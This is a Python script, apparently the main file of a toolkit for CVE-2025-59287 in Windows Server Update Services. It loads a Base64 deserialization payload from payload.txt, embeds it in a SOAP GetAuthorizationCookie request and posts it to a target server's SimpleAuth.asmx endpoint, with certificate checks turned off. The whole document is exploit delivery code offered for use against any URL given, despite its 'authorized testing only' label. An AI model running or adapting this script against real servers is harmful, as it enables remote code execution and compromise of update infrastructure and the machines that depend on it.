# -*- coding: utf-8 -*-
"""
WSUS Security Research Toolkit - Main execution script.
CVE-2025-59287 - Authorized security testing only.
"""
import argparse
import base64
import os
import sys
import time

try:
    import requests
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning
    )
except ImportError:
    print("[-] Install requests: pip install requests")
    sys.exit(1)

from ui import (
    banner, box, box_bottom, line, ok, fail, warn, info, section, separator, usage_help
)

PAYLOAD_FILE = "payload.txt"
DEFAULT_DELAY = 1.0
WSUS_SOAP_NS = "http://www.microsoft.com/SoftwareDistribution"
SOAP_ENVELOPE_NS = "http://schemas.xmlsoap.org/soap/envelope/"


def load_payload():
    """Load Base64 payload from payload.txt if present."""
    if not os.path.isfile(PAYLOAD_FILE):
        return None
    try:
        with open(PAYLOAD_FILE, "r", encoding="utf-8", errors="ignore") as f:
            data = f.read().strip()
        if not data:
            return None
        return data
    except Exception as e:
        warn("Could not read payload.txt: " + str(e))
        return None


def build_soap_body(payload_b64=None):
    """Build SOAP body for WSUS request (research template)."""
    body_content = ""
    if payload_b64:
        body_content = f"""
        <GetAuthorizationCookie xmlns="{WSUS_SOAP_NS}">
            <OptionalPayload>{payload_b64}</OptionalPayload>
        </GetAuthorizationCookie>"""
    else:
        body_content = f"""
        <GetAuthorizationCookie xmlns="{WSUS_SOAP_NS}">
            <OptionalPayload></OptionalPayload>
        </GetAuthorizationCookie>"""
    return f"""<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="{SOAP_ENVELOPE_NS}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soap:Body>
    {body_content.strip()}
  </soap:Body>
</soap:Envelope>"""


def run_test(target_url, no_wait=False):
    """Run connectivity and SOAP test against WSUS server."""
    delay = 0 if no_wait else DEFAULT_DELAY
    payload_b64 = load_payload()

    banner()
    section(" Target ")
    info("URL: " + target_url)
    if payload_b64:
        ok("Payload loaded from " + PAYLOAD_FILE + " (" + str(len(payload_b64)) + " chars)")
    else:
        warn("No " + PAYLOAD_FILE + " or empty; using empty payload")
    print(box_bottom(60))

    section(" Connection ")
    try:
        r = requests.get(
            target_url.rstrip("/") + "/",
            timeout=10,
            verify=False,
            allow_redirects=True,
        )
        ok("Server reachable: HTTP " + str(r.status_code))
    except requests.exceptions.SSLError as e:
        warn("SSL warning (ignored for lab): " + str(e)[:60])
        try:
            r = requests.get(target_url.rstrip("/") + "/", timeout=10, verify=False)
            ok("Server reachable: HTTP " + str(r.status_code))
        except Exception as e2:
            fail("Connection failed: " + str(e2))
            return False
    except Exception as e:
        fail("Connection failed: " + str(e))
        return False
    print(box_bottom(60))

    section(" SOAP Request ")
    soap_body = build_soap_body(payload_b64)
    info("Request length: " + str(len(soap_body)) + " bytes")
    print(box_bottom(60))

    section(" SOAP Call ")
    soap_url = target_url.rstrip("/") + "/SimpleAuthWebService/SimpleAuth.asmx"
    headers = {
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": '"http://www.microsoft.com/SoftwareDistribution/GetAuthorizationCookie"',
    }
    try:
        if delay > 0:
            time.sleep(delay)
        resp = requests.post(
            soap_url,
            data=soap_body,
            headers=headers,
            timeout=15,
            verify=False,
        )
        info("Response status: " + str(resp.status_code))
        info("Response length: " + str(len(resp.text)) + " bytes")
        if resp.status_code == 200:
            ok("SOAP request accepted by server")
        else:
            warn("Unexpected status (may still indicate processing)")
        if "soap:Fault" in resp.text or "Fault" in resp.text:
            warn("SOAP Fault or error present in response")
        else:
            info("No SOAP Fault in response body")
    except Exception as e:
        fail("SOAP request failed: " + str(e))
        return False
    print(box_bottom(60))

    section(" Result ")
    info("Event IDs and deserialization behavior depend on server configuration.")
    info("Review server logs (Windows Event Log) for Event IDs.")
    if payload_b64:
        info("Deserialization attempt with custom payload was sent.")
    else:
        info("Empty payload was sent; no deserialization attempt.")
    ok("Test run completed.")
    print(box_bottom(60))
    print()
    return True


def main():
    parser = argparse.ArgumentParser(
        description="WSUS Security Research Toolkit - CVE-2025-59287",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("target_url", nargs="?", help="WSUS server URL (e.g. http://192.168.1.100:8533)")
    parser.add_argument("--no-wait", action="store_true", help="Skip delay between requests")
    args = parser.parse_args()

    if not args.target_url or args.target_url in ("--help", "-h"):
        usage_help()
        return 0

    if not args.target_url.startswith("http://") and not args.target_url.startswith("https://"):
        args.target_url = "http://" + args.target_url

    success = run_test(args.target_url, no_wait=args.no_wait)
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
